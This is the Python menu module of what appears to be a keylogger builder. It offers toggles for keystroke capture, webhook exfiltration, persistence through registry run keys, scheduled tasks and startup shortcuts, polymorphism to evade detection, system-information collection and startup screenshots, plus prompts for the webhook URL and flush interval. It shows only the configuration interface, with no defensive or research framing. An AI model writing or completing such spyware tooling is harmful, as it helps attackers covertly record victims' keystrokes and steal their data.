"""
Menu system for handling user input and navigation.
"""

from typing import TYPE_CHECKING
from .display import DisplayManager

if TYPE_CHECKING:
    from config.settings import BuilderConfig


class MenuSystem:
    """Handles menu navigation and user input processing."""
    
    def __init__(self, config: 'BuilderConfig'):
        self.config = config
        self.display = DisplayManager()
        
    def run_main_menu(self):
        """Run the main application loop."""
        while True:
            self.display.clear_screen()
            self.display.print_banner()
            self.display.print_menu(self.config)
            
            choice = input(f"\nEnter choice: ").upper()
            
            if choice == '1':
                self.config.toggle_feature('core_keylogger')
            elif choice == '2':
                self.config.toggle_feature('log_to_file')
            elif choice == '3':
                self.config.toggle_feature('webhook_exfiltration')
            elif choice == '4':
                self.config.toggle_feature('persistence')
            elif choice == '5':
                self.config.toggle_feature('polymorphism')
            elif choice == '6':
                self.config.toggle_feature('uninstall_script')
            elif choice == '7':
                self.config.toggle_feature('debug_mode')
            elif choice == '8':
                self.config.toggle_feature('system_info_collection')
            elif choice == '9':
                self.config.toggle_feature('startup_screenshot')
            elif choice == '10':
                self.run_persistence_menu()
            elif choice == '11':
                self.run_settings_menu()
            elif choice == 'B':
                return 'BUILD'
            elif choice == 'Q':
                return 'QUIT'
                
    def run_persistence_menu(self):
        """Run the persistence configuration menu."""
        while True:
            self.display.clear_screen()
            self.display.print_banner()
            self.display.print_persistence_menu(self.config)
            
            choice = input(f"\nEnter choice: ").upper()
            
            if choice == '1':
                self.config.toggle_persistence_option('registry_run')
            elif choice == '2':
                self.config.toggle_persistence_option('task_scheduler')
            elif choice == '3':
                self.config.toggle_persistence_option('startup_shortcut')
            elif choice == 'B':
                break
                
    def run_settings_menu(self):
        """Run the settings configuration menu."""
        while True:
            self.display.clear_screen()
            self.display.print_banner()
            self.display.print_settings_menu(self.config)
            
            choice = input(f"\nEnter choice: ").upper()
            
            if choice == '1' and self.config.features['webhook_exfiltration']:
                url = input("Enter webhook URL: ").strip()
                if url:
                    self.config.set_webhook_url(url)
            elif choice == '2':
                try:
                    interval = int(input("Enter flush interval (seconds): "))
                    if interval > 0:
                        self.config.set_flush_interval(interval)
                    else:
                        self.display.print_error("Invalid interval. Please enter a positive number.")
                except ValueError:
                    self.display.print_error("Invalid interval. Please enter a number.")
            elif choice == 'B':
                break 